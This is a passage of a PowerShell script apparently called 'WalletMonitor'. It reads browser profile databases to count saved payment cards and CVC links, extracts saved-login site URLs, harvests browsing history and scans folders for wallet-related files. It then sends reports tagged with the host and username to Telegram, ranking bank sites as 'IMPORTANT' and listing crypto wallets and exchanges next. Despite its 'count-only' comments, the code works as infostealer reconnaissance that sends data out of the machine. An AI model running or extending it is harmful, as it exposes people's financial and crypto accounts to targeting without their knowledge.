        Copy-LockedFile -Source $DbPath -Dest $tmp

        $info = Get-SqliteInfo -Path $tmp -Table $CardsTable
        if ($info.RootPage -eq 0) { return $result }   # There is no card table at all
        $result.Cards = [int](Get-SqliteRowCount $info.Bytes $info.RootPage $info.PageSize $info.Usable $info.TotalPages)
        if ($result.Cards -le 0) { return $result }

        # guid only — no other column
        $cardGuids = New-Object 'System.Collections.Generic.HashSet[string]' ([System.StringComparer]::Ordinal)
        foreach ($g in @(Get-SqliteColumnValues -Path $tmp -Table $CardsTable -Column 'guid')) {
            if (-not [string]::IsNullOrWhiteSpace($g)) { [void]$cardGuids.Add([string]$g) }
        }

        # Is there any stored CVC at all? If not -> status "not stored", and we do not guess zero.
        $cvInfo = Get-SqliteInfo -Path $tmp -Table $CvvTable
        if ($cvInfo.RootPage -eq 0) {
            $result.CvvKnown = $false
        } else {
            $result.CvvKnown    = $true
            $result.HasCvvTable = $true
            if ($cardGuids.Count -gt 0) {
                $matched = New-Object 'System.Collections.Generic.HashSet[string]' ([System.StringComparer]::Ordinal)
                foreach ($v in @(Get-SqliteColumnValues -Path $tmp -Table $CvvTable -Column 'guid')) {
                    if (-not [string]::IsNullOrWhiteSpace($v) -and $cardGuids.Contains([string]$v)) { [void]$matched.Add([string]$v) }
                }
                $result.CvvLinked = $matched.Count
            }
        }
    } finally {
        if (Test-Path -LiteralPath $tmp) { Remove-Item -LiteralPath $tmp -Force -ErrorAction SilentlyContinue }
    }
    return $result
}

function Get-FirefoxCardCount {
    <# Counts cards from autofill-profiles.json by counting guid keys inside the creditCards array only.
       The file is not converted into objects and no card fields are read. Firefox never stores CVC. #>
    param([string]$ProfileDir)
    $f = Join-Path $ProfileDir 'autofill-profiles.json'
    if (-not (Test-Path -LiteralPath $f)) { return $null }
    $raw = [System.IO.File]::ReadAllText($f, [System.Text.Encoding]::UTF8)
    $m = [regex]::Match($raw, '"creditCards"\s*:\s*\[', 'IgnoreCase')
    if (-not $m.Success) { return @{ Cards = 0; CvvLinked = 0; CvvKnown = $true } }
    $start = $m.Index + $m.Length
    $depth = 1
    $i = $start
    $end = -1
    while ($i -lt $raw.Length) {
        $ch = $raw[$i]
        if ($ch -eq '[') { $depth++ }
        elseif ($ch -eq ']') { $depth--; if ($depth -eq 0) { $end = $i; break } }
        $i++
    }
    if ($end -lt 0) { $end = $raw.Length }
    $seg = if ($end -gt $start) { $raw.Substring($start, $end - $start) } else { '' }
    $cards = ([regex]::Matches($seg, '"guid"\s*:', 'IgnoreCase')).Count
    return @{ Cards = $cards; CvvLinked = 0; CvvKnown = $true }
}

function Invoke-BrowserCardScan {
    <# Scans all browsers and determines the number of saved cards per profile + whether they are CVV-linked. Count-only. #>
    Write-Log 'Scanning saved payment cards (count-only — no extraction)...'
    $Script:CardStats = @()
    $ccCfg = Get-Prop $Script:Cfg 'credit_cards' $null
    if (-not [bool](Get-Prop $ccCfg 'enabled' $true)) { Write-Log 'Card scanning is disabled in the config.' 'DEBUG'; return }

    $stats  = New-Object System.Collections.ArrayList
    $errors = New-Object System.Collections.ArrayList
    $tmpDir = New-TempDir
    try {
        # ---------- Chromium family ----------
        foreach ($br in @(Get-Prop $Script:Cfg 'chromium_browsers' @())) {
            if (-not [bool](Get-Prop $br 'enabled' $true)) { continue }
            $name = [string](Get-Prop $br 'name' 'Chromium')
            $ud = Expand-PathString ([string](Get-Prop $br 'user_data' ''))
            if (-not $ud -or -not (Test-Path -LiteralPath $ud)) { continue }

            foreach ($prof in @(Get-ChromiumProfiles $ud)) {
                $webData = Join-Path $prof.FullName 'Web Data'
                if (-not (Test-Path -LiteralPath $webData)) { continue }
                try {
                    $r = Get-CardCountsFromSqlite -DbPath $webData -TmpDir $tmpDir
                    if ($r.Cards -gt 0 -or $r.CvvLinked -gt 0) {
                        [void]$stats.Add((New-CardStat -Browser $name -Profile $prof.Name -Cards $r.Cards -CvvLinked $r.CvvLinked -CvvKnown $r.CvvKnown -Source 'Web Data'))
                    }
                } catch {
                    [void]$errors.Add("$name/$($prof.Name): $($_.Exception.Message)")
                }
            }
        }

        # ---------- Firefox ----------
        $ff = Get-Prop $Script:Cfg 'firefox' $null
        if ([bool](Get-Prop $ff 'enabled' $true)) {
            $root = Expand-PathString ([string](Get-Prop $ff 'profile_root' ''))
            if ($root -and (Test-Path -LiteralPath $root)) {
                foreach ($prof in @(Get-ChildItem -LiteralPath $root -Directory -Force -ErrorAction SilentlyContinue)) {
                    try {
                        $r = Get-FirefoxCardCount -ProfileDir $prof.FullName
                        if ($r -and $r.Cards -gt 0) {
                            [void]$stats.Add((New-CardStat -Browser 'Firefox' -Profile $prof.Name -Cards $r.Cards -CvvLinked 0 -CvvKnown $true -Source 'autofill-profiles.json'))
                        }
                    } catch {
                        [void]$errors.Add("Firefox/$($prof.Name): $($_.Exception.Message)")
                    }
                }
            }
        }
    } finally {
        Remove-Item -LiteralPath $tmpDir -Recurse -Force -ErrorAction SilentlyContinue
    }

    foreach ($e in $errors) { Add-Error "cards: $e" }
    $Script:CardStats = @($stats | Sort-Object Browser, Profile)
    Write-Log "Profiles with saved cards: $($Script:CardStats.Count)"
}

function Get-CardAggregate {
    <# Aggregates the card and CVV counts per browser (sum of profiles). #>
    $groups = @{}
    foreach ($s in @($Script:CardStats)) {
        $b = [string]$s.Browser
        if (-not $groups.ContainsKey($b)) {
            $groups[$b] = [PSCustomObject]@{ Browser = $b; Cards = 0; CvvLinked = 0; CvvKnown = $false; Profiles = 0 }
        }
        $groups[$b].Cards     = [int]$groups[$b].Cards + [int]$s.Cards
        $groups[$b].CvvLinked = [int]$groups[$b].CvvLinked + [int]$s.CvvLinked
        $groups[$b].Profiles  = [int]$groups[$b].Profiles + 1
        if ($s.CvvKnown) { $groups[$b].CvvKnown = $true }
    }
    return @($groups.Values | Sort-Object Cards -Descending)
}

function Get-CardSignature {
    <# Fingerprint used to detect changes in card counts/CVV linkage between runs. #>
    $parts = New-Object System.Collections.ArrayList
    foreach ($s in @($Script:CardStats | Sort-Object Browser, Profile)) {
        [void]$parts.Add(("{0}|{1}|{2}|{3}" -f $s.Browser, $s.Profile, $s.Cards, $s.CvvLinked))
    }
    $raw = ($parts -join ';')
    if ([string]::IsNullOrWhiteSpace($raw)) { $raw = 'no-cards' }
    return (Get-Sha256Short $raw)
}

function Get-CardSummaryTotals {
    $tot = 0; $cvv = 0
    foreach ($s in @($Script:CardStats)) { $tot += [int]$s.Cards; $cvv += [int]$s.CvvLinked }
    return @{ Cards = $tot; CvvLinked = $cvv }
}

function Build-CardReportLines {
    <# Builds a professional card report (count-only). -Full adds per-profile details. #>
    param([switch]$Full)
    $lines = New-Object System.Collections.ArrayList
    $agg   = @(Get-CardAggregate)
    $tot   = Get-CardSummaryTotals
    $ts    = (Get-Date).ToString('yyyy-MM-dd HH:mm')

    [void]$lines.Add('💳 <b>Saved payment cards — WalletMonitor</b>')
    [void]$lines.Add('━━━━━━━━━━━━━━━━')
    [void]$lines.Add("🖥 Host: <code>$(ConvertTo-HtmlSafe $Script:HostLabel)</code> · 👤 $([string]$env:USERNAME)")
    [void]$lines.Add("🕒 Report time: $ts")
    [void]$lines.Add('🔒 <i>Count-only — no card number or name is extracted, stored, or sent, and no encryption is decrypted.</i>')

    if ($agg.Count -eq 0) {
        [void]$lines.Add('')
        [void]$lines.Add('ℹ️ No saved payment cards in any supported browser.')
        return @($lines)
    }

    [void]$lines.Add('')
    [void]$lines.Add("📊 Total: <b>$($tot.Cards)</b> card(s) · CVC-linked: <b>$($tot.CvvLinked)</b> · profiles with cards: <b>$(@($Script:CardStats).Count)</b>")
    [void]$lines.Add('')
    [void]$lines.Add('🌐 <b>Per browser:</b>')
    foreach ($g in $agg) {
        $cvvTxt = 'CVC: not available (nothing stored)'
        if ($g.CvvLinked -gt 0) { $cvvTxt = "CVC-linked: <b>$($g.CvvLinked)</b>" }
        elseif ($g.CvvKnown) { $cvvTxt = 'CVC not stored' }
        [void]$lines.Add("   • $(ConvertTo-HtmlSafe $g.Browser): cards <b>$($g.Cards)</b> · $cvvTxt · profiles $($g.Profiles)")
    }

    if (-not $Full) { return @($lines) }

    foreach ($g in $agg) {
        [void]$lines.Add('')
        [void]$lines.Add('━━━━━━━━━━━━━━━━')
        [void]$lines.Add("🌐 <b>$(ConvertTo-HtmlSafe $g.Browser)</b> — profile details")
        foreach ($s in @($Script:CardStats | Where-Object { $_.Browser -eq $g.Browser })) {
            $cvvTxt = 'CVC: not available'
            if ($s.CvvLinked -gt 0) { $cvvTxt = "CVC linked: $($s.CvvLinked)" }
            elseif ($s.CvvKnown) { $cvvTxt = 'CVC not stored' }
            [void]$lines.Add("   • $(ConvertTo-HtmlSafe $s.Profile): cards $($s.Cards) · $cvvTxt")
        }
    }

    [void]$lines.Add('')
    [void]$lines.Add('━━━━━━━━━━━━━━━━')
    [void]$lines.Add('ℹ️ <i>Chromium (Chrome/Edge/Brave/Vivaldi/Chromium): counted by counting the rows of the credit_cards table cell-by-cell; CVC linkage is checked via the presence of a local_stored_cvc table matched by guid only.')
    [void]$lines.Add('No card values are decrypted: only the guid column is read; the remaining columns (name/encrypted number) are skipped byte-by-byte without decryption or storage.')
    [void]$lines.Add('Firefox: counted by counting guid keys inside the creditCards array textually. Chromium and Firefox do not store CVC/CVV by default; "linked" is reported only when a stored CVV actually exists.</i>')
    return @($lines)
}

function Send-CardReport {
    param([switch]$Force, [switch]$Full)
    $ccCfg = Get-Prop $Script:Cfg 'credit_cards' $null
    if (-not $Force -and -not [bool](Get-Prop $ccCfg 'notify_on_change' $true)) { return }
    $maxChars = [int](Get-Prop (Get-Prop (Get-Prop $Script:Cfg 'browser_history') 'report') 'max_message_chars' 3500)
    $lines = Build-CardReportLines -Full:$Full
    if (@($lines).Count -eq 0) { return }
    $chunks = @(Split-MessageChunks -Lines $lines -MaxChars $maxChars)
    $total = $chunks.Count
    $sentAll = $true
    for ($i = 0; $i -lt $total; $i++) {
        $prefix = ''
        if ($total -gt 1) { $prefix = "📄 [$($i + 1)/$total]`n" }
        if (-not (Send-TelegramMessage -Text ($prefix + $chunks[$i]))) { $sentAll = $false }
    }
    if ($sentAll) { Write-Log "Card report sent ($total message(s))." }
    else { Write-Log 'Failed to send part of the card report.' 'ERROR' }
}

# =====================================================================
#  12.7)  Check 4-C: saved logins -> site URLs only (no passwords)
#        - Chromium/Edge/Brave/Vivaldi/Opera/Chromium: "Login Data" -> logins table, origin_url only
#        - Firefox: logins.json -> the "hostname" keys only
#        - No username, no password and no encrypted blob is read, decrypted or stored.
# =====================================================================

function New-LoginStat {
    param([string]$Browser, [string]$Profile, [int]$Logins, [string]$Source)
    return [PSCustomObject]@{
        Browser = $Browser
        Profile = $Profile
        Logins  = $Logins
        Source  = $Source
    }
}

function Get-LoginUrlsFromSqlite {
    <# Reads only the origin_url column of the logins table. Nothing else is touched:
       no username_value, no password_value and no encrypted blob is read, copied or decrypted. #>
    param([string]$DbPath, [string]$TmpDir)
    $result = @{ Logins = 0; Urls = @(); HasTable = $false }
    if (-not (Test-Path -LiteralPath $DbPath)) { return $result }
    if ([string]::IsNullOrWhiteSpace($TmpDir)) { $TmpDir = New-TempDir }
    $tmp = Join-Path $TmpDir ("logins_" + [guid]::NewGuid().ToString('N') + ".db")
    try {
        Copy-LockedFile -Source $DbPath -Dest $tmp
        $info = Get-SqliteInfo -Path $tmp -Table 'logins'
        if ($info.RootPage -eq 0) { return $result }
        $result.HasTable = $true
        $result.Logins = [int](Get-SqliteRowCount $info.Bytes $info.RootPage $info.PageSize $info.Usable $info.TotalPages)
        if ($result.Logins -le 0) { return $result }
        $urls = New-Object System.Collections.ArrayList
        foreach ($u in @(Get-SqliteColumnValues -Path $tmp -Table 'logins' -Column 'origin_url')) {
            if (-not [string]::IsNullOrWhiteSpace($u)) { [void]$urls.Add([string]$u) }
        }
        $result.Urls = @($urls)
    } finally {
        if (Test-Path -LiteralPath $tmp) { Remove-Item -LiteralPath $tmp -Force -ErrorAction SilentlyContinue }
    }
    return $result
}

function Get-FirefoxLoginUrls {
    <# Reads only the "hostname" JSON keys from logins.json.
       The encrypted username/password fields are never parsed or decrypted. #>
    param([string]$ProfileDir)
    $result = @{ Logins = 0; Urls = @(); HasTable = $false }
    $f = Join-Path $ProfileDir 'logins.json'
    if (-not (Test-Path -LiteralPath $f)) { return $result }
    try {
        $raw = [System.IO.File]::ReadAllText($f, [System.Text.Encoding]::UTF8)
        $m = [regex]::Matches($raw, '"hostname"\s*:\s*"([^"]+)"')
        $urls = New-Object System.Collections.ArrayList
        foreach ($x in $m) { [void]$urls.Add($x.Groups[1].Value) }
        if ($urls.Count -gt 0) {
            $result.HasTable = $true
            $result.Logins  = $urls.Count
            $result.Urls    = @($urls)
        }
    } catch { }
    return $result
}

function Invoke-BrowserLoginScan {
    <# Finds the sites stored in each browser's saved passwords and reports the URLs only.
       Passwords are never read: only the origin_url / hostname column. #>
    Write-Log 'Scanning saved logins (site URLs only - no passwords)...'
    $Script:LoginStats = @()
    $lgCfg = Get-Prop $Script:Cfg 'saved_logins' $null
    if (-not [bool](Get-Prop $lgCfg 'enabled' $true)) { Write-Log 'Saved-login scanning is disabled in the config.' 'DEBUG'; return }

    $stats  = New-Object System.Collections.ArrayList
    $errors = New-Object System.Collections.ArrayList
    $tmpDir = New-TempDir
    try {
        # ---------- Chromium family ----------
        foreach ($br in @(Get-Prop $Script:Cfg 'chromium_browsers' @())) {
            if (-not [bool](Get-Prop $br 'enabled' $true)) { continue }
            $name = [string](Get-Prop $br 'name' 'Chromium')
            $ud = Expand-PathString ([string](Get-Prop $br 'user_data' ''))
            if (-not $ud -or -not (Test-Path -LiteralPath $ud)) { continue }

            foreach ($prof in @(Get-ChromiumProfiles $ud)) {
                $ld = Join-Path $prof.FullName 'Login Data'
                if (-not (Test-Path -LiteralPath $ld)) { continue }
                try {
                    $r = Get-LoginUrlsFromSqlite -DbPath $ld -TmpDir $tmpDir
                    if ($r.Logins -gt 0) {
                        $st = New-LoginStat -Browser $name -Profile $prof.Name -Logins $r.Logins -Source 'Login Data'
                        $st | Add-Member -NotePropertyName Urls -NotePropertyValue @($r.Urls) -Force
                        [void]$stats.Add($st)
                    }
                } catch {
                    [void]$errors.Add("$name/$($prof.Name): $($_.Exception.Message)")
                }
            }
        }

        # ---------- Firefox ----------
        $ff = Get-Prop $Script:Cfg 'firefox' $null
        if ([bool](Get-Prop $ff 'enabled' $true)) {
            $root = Expand-PathString ([string](Get-Prop $ff 'profile_root' ''))
            if ($root -and (Test-Path -LiteralPath $root)) {
                foreach ($prof in @(Get-ChildItem -LiteralPath $root -Directory -Force -ErrorAction SilentlyContinue)) {
                    try {
                        $r = Get-FirefoxLoginUrls -ProfileDir $prof.FullName
                        if ($r.Logins -gt 0) {
                            $st = New-LoginStat -Browser 'Firefox' -Profile $prof.Name -Logins $r.Logins -Source 'logins.json'
                            $st | Add-Member -NotePropertyName Urls -NotePropertyValue @($r.Urls) -Force
                            [void]$stats.Add($st)
                        }
                    } catch {
                        [void]$errors.Add("Firefox/$($prof.Name): $($_.Exception.Message)")
                    }
                }
            }
        }
    } finally {
        Remove-Item -LiteralPath $tmpDir -Recurse -Force -ErrorAction SilentlyContinue
    }

    foreach ($e in $errors) { Add-Error "logins: $e" }
    $Script:LoginStats = @($stats | Sort-Object Browser, Profile)
    Write-Log "Profiles with saved logins: $($Script:LoginStats.Count)"
}

function Get-LoginAggregate {
    <# Aggregates the login counts per browser (sum of profiles). #>
    $groups = @{}
    foreach ($s in @($Script:LoginStats)) {
        $b = [string]$s.Browser
        if (-not $groups.ContainsKey($b)) {
            $groups[$b] = [PSCustomObject]@{ Browser = $b; Logins = 0; Profiles = 0 }
        }
        $groups[$b].Logins   = [int]$groups[$b].Logins + [int]$s.Logins
        $groups[$b].Profiles = [int]$groups[$b].Profiles + 1
    }
    return @($groups.Values | Sort-Object Logins -Descending)
}

function Get-LoginUniqueUrls {
    <# Unique site URLs across all profiles/browsers (de-duplicated). #>
    $map = [ordered]@{}
    foreach ($s in @($Script:LoginStats)) {
        foreach ($u in @($s.Urls)) {
            $t = ([string]$u).Trim()
            if ([string]::IsNullOrWhiteSpace($t)) { continue }
            $k = Normalize-HistoryUrl $t
            if ([string]::IsNullOrWhiteSpace($k)) { $k = $t.ToLowerInvariant() }
            if (-not $map.Contains($k)) { $map[$k] = $t }
        }
    }
    return @($map.Values)
}

function Get-LoginSignature {
    <# Fingerprint of the saved-site set, used to detect changes between runs. #>
    $urls = @(Get-LoginUniqueUrls | Sort-Object)
    $raw = ($urls -join ';')
    if ([string]::IsNullOrWhiteSpace($raw)) { $raw = 'no-logins' }
    return (Get-Sha256Short $raw)
}

function Build-LoginReportLines {
    <# Report of the sites kept in the browsers' password stores, grouped and sorted by
       category: banks/payments first, then crypto wallets, exchanges, dApps, crypto
       sites, other. URLs only - no credentials. #>
    param([switch]$Full)
    $lines   = New-Object System.Collections.ArrayList
    $agg     = @(Get-LoginAggregate)
    $urls    = @(Get-LoginUniqueUrls)
    $total   = 0
    foreach ($s in @($Script:LoginStats)) { $total += [int]$s.Logins }
    $ts      = (Get-Date).ToString('yyyy-MM-dd HH:mm')
    $maxUrls = [int](Get-Prop (Get-Prop $Script:Cfg 'saved_logins') 'max_urls' 120)

    [void]$lines.Add('🔑 <b>Saved logins - site URLs</b>')
    [void]$lines.Add('━━━━━━━━━━━━━━')
    [void]$lines.Add("🖻 Host: <code>$(ConvertTo-HtmlSafe $Script:HostLabel)</code> · 👤 $([System.Environment]::UserName)")
    [void]$lines.Add("🕒 Report time: $ts")
    [void]$lines.Add('🔒 <i>URLs only - no username and no password is read, decrypted, stored or sent.</i>')

    if ($total -eq 0) {
        [void]$lines.Add('')
        [void]$lines.Add('ℹ️ No saved logins in any supported browser.')
        return @($lines)
    }

    # Group the unique URLs per site (host with a leading "www." stripped) and count the
    # stored logins per site across all browsers/profiles.
    $sites    = @{}
    $siteCnts = @{}
    foreach ($u in $urls) {
        $h = Get-UrlHost $u
        if ([string]::IsNullOrWhiteSpace($h)) { $h = ([string]$u).Trim() }
        $key = $h
        if ($key.StartsWith('www.')) { $key = $key.Substring(4) }
        if (-not $sites.ContainsKey($key)) {
            $cat = Get-LoginCategory -Url $u
            $vbk = $false
            if ($cat -eq 'bank') { $vbk = Test-VerifiedBankHost -HostName $key }
            $sites[$key] = [PSCustomObject]@{
                Host     = $key
                Urls     = (New-Object System.Collections.ArrayList)
                Category = $cat
                Verified = $vbk
            }
        }
        [void]$sites[$key].Urls.Add(([string]$u))
    }
    foreach ($s in @($Script:LoginStats)) {
        foreach ($u in @($s.Urls)) {
            $t = ([string]$u).Trim()
            if ([string]::IsNullOrWhiteSpace($t)) { continue }
            $h = Get-UrlHost $t
            if ([string]::IsNullOrWhiteSpace($h)) { $h = $t }
            if ($h.StartsWith('www.')) { $h = $h.Substring(4) }
            if (-not $siteCnts.ContainsKey($h)) { $siteCnts[$h] = 0 }
            $siteCnts[$h] = [int]$siteCnts[$h] + 1
        }
    }

    $siteList = @($sites.Values)
    $catOrder = @('bank', 'wallet', 'exchange', 'shopping', 'dapp', 'crypto', 'other')
    $catNames = @{ bank = 'banks'; wallet = 'wallets'; exchange = 'exchanges'; shopping = 'shopping'; dapp = 'dApps'; crypto = 'crypto'; other = 'other' }

    $catSummary = New-Object System.Collections.ArrayList
    foreach ($c in $catOrder) {
        $inCat = @($siteList | Where-Object { $_.Category -eq $c })
        if ($inCat.Count -eq 0) { continue }
        if ($c -eq 'bank') {
            $vb = @($inCat | Where-Object { $_.Verified }).Count
            if ($vb -gt 0) { [void]$catSummary.Add(("banks: <b>{0}</b> (⭐ {1} verified)" -f $inCat.Count, $vb)) }
            else { [void]$catSummary.Add(("banks: <b>{0}</b>" -f $inCat.Count)) }
        } else {
            [void]$catSummary.Add(("{0}: <b>{1}</b>" -f $catNames[$c], $inCat.Count))
        }
    }

    [void]$lines.Add('')
    [void]$lines.Add("📊 Stored logins: <b>$total</b> · unique sites: <b>$($urls.Count)</b> · profiles: <b>$(@($Script:LoginStats).Count)</b>")
    if ($catSummary.Count -gt 0) {
        [void]$lines.Add('')
        [void]$lines.Add("🗂 Categories: " + ($catSummary -join ' · '))
    }
    [void]$lines.Add('')
    [void]$lines.Add('🌐 <b>Per browser:</b>')
    foreach ($g in $agg) {
        [void]$lines.Add("   • $(ConvertTo-HtmlSafe $g.Browser): logins <b>$($g.Logins)</b> · profiles $($g.Profiles)")
    }

    $shown     = 0
    $truncated = $false
    foreach ($c in $catOrder) {
        $inCat = @($siteList | Where-Object { $_.Category -eq $c } | Sort-Object -Property @{ Expression = { @($_.Urls).Count }; Descending = $true }, @{ Expression = { $_.Host } })
        if ($inCat.Count -eq 0) { continue }
        $meta = Get-LoginCategoryMeta $c
        [void]$lines.Add('')
        [void]$lines.Add('━━━━━━━━━━━━━━')
        $imp = ''
        if ($c -eq 'bank') { $imp = ' ⭐ <b>IMPORTANT</b>' }
        [void]$lines.Add("$($meta.Icon) <b>$($meta.Title)</b>$imp - $($inCat.Count) site(s)")
        foreach ($site in $inCat) {
            if ($shown -ge $maxUrls) { $truncated = $true; break }
            $cnt = 0
            if ($siteCnts.ContainsKey($site.Host)) { $cnt = [int]$siteCnts[$site.Host] }
            $ver = ''
            if ($c -eq 'bank' -and $site.Verified) { $ver = ' ✔ <i>verified bank</i>' }
            [void]$lines.Add("   • $(ConvertTo-HtmlSafe $site.Host) — <b>$cnt</b> login(s)$ver")
            $n = 0
            foreach ($su in @($site.Urls)) {
                if ($n -ge 2 -or $shown -ge $maxUrls) { break }
                [void]$lines.Add("      🔗 <code>$(ConvertTo-HtmlSafe (Limit-Text $su 160))</code>")
                $n++
                $shown++
            }
        }
        if ($truncated) { break }
    }
    if ($truncated) {
        [void]$lines.Add('   … listing truncated (saved_logins.max_urls reached) - the full list is in the log.')
    }

    if ($Full) {
        foreach ($g in $agg) {
            [void]$lines.Add('')
            [void]$lines.Add('━━━━━━━━━━━━━━')
            [void]$lines.Add("🌐 <b>$(ConvertTo-HtmlSafe $g.Browser)</b> - profile details")
            foreach ($s in @($Script:LoginStats | Where-Object { $_.Browser -eq $g.Browser })) {
                [void]$lines.Add("   • $(ConvertTo-HtmlSafe $s.Profile): logins $($s.Logins) · $($s.Source)")
            }
        }
    }

    [void]$lines.Add('')
    [void]$lines.Add('━━━━━━━━━━━━━━')
    [void]$lines.Add('ℹ️ <i>Chromium (Chrome/Edge/Brave/Vivaldi/Opera/Chromium): only the origin_url column of the logins table is read.')
    [void]$lines.Add('Firefox: only the hostname keys of logins.json are read. Password values, usernames and encrypted blobs are never read, decrypted or stored.</i>')
    return @($lines)
}

function Send-LoginReport {
    param([switch]$Force, [switch]$Full)
    $lgCfg = Get-Prop $Script:Cfg 'saved_logins' $null
    if (-not $Force -and -not [bool](Get-Prop $lgCfg 'notify_on_change' $true)) { return }
    $maxChars = [int](Get-Prop (Get-Prop (Get-Prop $Script:Cfg 'browser_history') 'report') 'max_message_chars' 3500)
    $lines = Build-LoginReportLines -Full:$Full
    if (@($lines).Count -eq 0) { return }
    $chunks = @(Split-MessageChunks -Lines $lines -MaxChars $maxChars)
    $total = $chunks.Count
    $sentAll = $true
    for ($i = 0; $i -lt $total; $i++) {
        $prefix = ''
        if ($total -gt 1) { $prefix = "📄 [$($i + 1)/$total]`n" }
        if (-not (Send-TelegramMessage -Text ($prefix + $chunks[$i]))) { $sentAll = $false }
    }
    if ($sentAll) { Write-Log "Login report sent ($total message(s))." }
    else { Write-Log 'Failed to send part of the login report.' 'ERROR' }
}

function Invoke-BrowserHistoryScan {
    Write-Log 'Scanning browser history (direct PowerShell reader - all browsers)...'
    $Script:HistoryHits     = @()
    $Script:NewHistoryCount = 0
    $Script:HistoryStats    = @()
    $Script:HistoryBrowsers = 0

    $res = Get-HistoryHits
    foreach ($e in @($res.Errors)) { Add-Error "history: $e" }
    $rawHits = @($res.Hits)
    $Script:HistoryStats = @($res.Stats)
    if ($rawHits.Count -eq 0 -and @($res.Errors).Count -gt 0) {
        Add-Error 'No history entries were extracted. Make sure History / places.sqlite files exist.'
    }
    Write-Log "Browser history entries extracted: $($rawHits.Count)"

    # Smart merge: the same URL from more than one browser/profile becomes a single line,
    # aggregating the browser names and taking the highest visit count and most recent visit date.
    $classified = New-Object System.Collections.ArrayList
    $index = @{}
    $order = New-Object System.Collections.ArrayList
    foreach ($h in $rawHits) {
        $browser = [string]$h.Browser
        $profile = [string]$h.Profile
        $url     = [string]$h.Url
        if ([string]::IsNullOrWhiteSpace($url)) { continue }

        $norm = Normalize-HistoryUrl $url
        if ([string]::IsNullOrWhiteSpace($norm)) { $norm = $url.ToLowerInvariant() }

        $title = [string]$h.Title
        $dt    = $h.LastTs
        $vis   = [int](Get-Prop $h 'Visits' 0)
        if ($vis -lt 0) { $vis = 0 }

        if ($index.ContainsKey($norm)) {
            $ent = $index[$norm]
            if ($vis -gt $ent.Visits) { $ent.Visits = $vis }
            if ($dt -and (-not $ent.LastTs -or $dt -gt $ent.LastTs)) { $ent.LastTs = $dt }
            if ($browser -and ($ent.Browsers -notcontains $browser)) { [void]$ent.Browsers.Add($browser) }
            if (-not $ent.Title -and $title) { $ent.Title = $title }
        } else {
            $brs = New-Object System.Collections.ArrayList
            if ($browser) { [void]$brs.Add($browser) }
            $index[$norm] = [PSCustomObject]@{
                Url      = $url
                Title    = $title
                Visits   = $vis
                LastTs   = $dt
                Browsers = $brs
                Profile  = $profile
            }
            [void]$order.Add($norm)
        }
    }

    foreach ($norm in $order) {
        $ent    = $index[$norm]
        $brList = @($ent.Browsers | Where-Object { -not [string]::IsNullOrWhiteSpace($_) })
        $brText = ($brList -join ', ')
        if ([string]::IsNullOrWhiteSpace($brText)) { $brText = '(unknown)' }

        $lastTxt = 'unknown'
        if ($ent.LastTs) { try { $lastTxt = $ent.LastTs.ToString('yyyy-MM-dd HH:mm') } catch { } }

        $category = Get-UrlCategory -Url $ent.Url -Title $ent.Title
        $host_    = Get-UrlHost $ent.Url
        if ([string]::IsNullOrWhiteSpace($host_)) { $host_ = '(unknown)' }

        [void]$classified.Add([PSCustomObject]@{
            Browser  = $brText
            Browsers = $brList
            Profile  = $ent.Profile
            Url      = $ent.Url
            Title    = $ent.Title
            Visits   = [int]$ent.Visits
            Last     = $lastTxt
            LastTs   = $ent.LastTs
            Host     = $host_
            Category = $category
        })

        $isNew = Register-Finding -Type 'history' -Key "history|$norm" -Label (Limit-Text $ent.Url 120) -Message '' -Silent
        if ($isNew) { $Script:NewHistoryCount++; Add-DailyCounter -Type 'history' }
    }

    $Script:HistoryHits = @($classified)
    $Script:HistoryBrowsers = @($Script:HistoryStats | Where-Object { $_.Count -gt 0 }).Count
    Write-Log "Entries after de-duplication: $($Script:HistoryHits.Count) (browser/profile: $($Script:HistoryBrowsers))"
}

# =====================================================================
#  13)  Check 4: filesystem
# =====================================================================

function Test-FileNameMatch {
    param([string]$Name, [string[]]$Patterns)
    foreach ($pat in $Patterns) {
        if ([string]::IsNullOrWhiteSpace($pat)) { continue }
        if ($Name -like $pat) { return $pat }
    }
    return $null
}

function Invoke-FileSystemScan {
    Write-Log 'Scanning filesystem artifacts...'

    $fs = Get-Prop $Script:Cfg 'filesystem' $null
    $rootsCfg     = @(Get-Prop $fs 'roots' @('%USERPROFILE%'))
    $maxDepth     = [int](Get-Prop $fs 'max_depth' 4)
    $maxItems     = [int](Get-Prop $fs 'max_items' 150000)
    $maxResults   = [int](Get-Prop $fs 'max_results' 200)
    $excludeDirs  = @(Get-Prop $fs 'exclude_dirs' @())
    $excludeFiles = @(Get-Prop $fs 'exclude_files' @())
    $excludePaths = @(Get-Prop $fs 'exclude_paths' @())

    $kwList   = @(Get-Prop $Script:Wallets 'file_keywords' @())
    $patterns = @(Get-Prop $Script:Wallets 'file_name_patterns' @())

    $selfDir = $Script:ScriptDir.TrimEnd('\')
    $excludePaths += $selfDir

    $visited = 0
    $results = 0

    foreach ($rootRaw in $rootsCfg) {
        $root = Expand-PathString $rootRaw
        if (-not $root -or -not (Test-Path -LiteralPath $root)) { continue }

        $stack = New-Object System.Collections.Stack
        $stack.Push([PSCustomObject]@{ Path = $root; Depth = 0 })

        while ($stack.Count -gt 0) {
            $cur = $stack.Pop()
            $curPath = $cur.Path
            $curDepth = $cur.Depth

            if ($visited -ge $maxItems) { Write-Log "Reached the maximum number of items ($maxItems). Filesystem scan stopped." 'WARN'; break }
            if ($results -ge $maxResults) { break }

            $entries = $null
            try { $entries = @(Get-ChildItem -LiteralPath $curPath -Force -ErrorAction Stop) }
            catch { Write-Log "Could not read directory: $curPath" 'DEBUG'; continue }

            foreach ($e in $entries) {
                $visited++
                if ($visited -ge $maxItems) { break }
                if ($results -ge $maxResults) { break }

                $isDir = $e.PSIsContainer
                $full  = $e.FullName

                $skip = $false
                foreach ($ex in $excludePaths) {
                    if ($ex -and $full.StartsWith($ex, [System.StringComparison]::OrdinalIgnoreCase)) { $skip = $true; break }
                }
                if ($skip) { continue }

                if ($isDir) {
                    if ($excludeDirs -contains $e.Name) { continue }
                    if ($curDepth -lt $maxDepth) { $stack.Push([PSCustomObject]@{ Path = $full; Depth = $curDepth + 1 }) }
                } else {
                    if ($excludeFiles -contains $e.Name) { continue }
                }

                $reason = $null
                $kw = Get-MatchedKeyword -Text $e.Name -Keywords $kwList
                if ($kw) { $reason = "Keyword in name: $kw" }

                if (-not $reason) {
                    $pat = Test-FileNameMatch -Name $e.Name -Patterns $patterns
                    if ($pat) { $reason = "Extension/filename match: $pat" }
                }
                if (-not $reason -and $isDir) {
                    $pat = Test-FileNameMatch -Name $e.Name -Patterns $patterns
                    if ($pat) { $reason = "Matching directory: $pat" }
                }
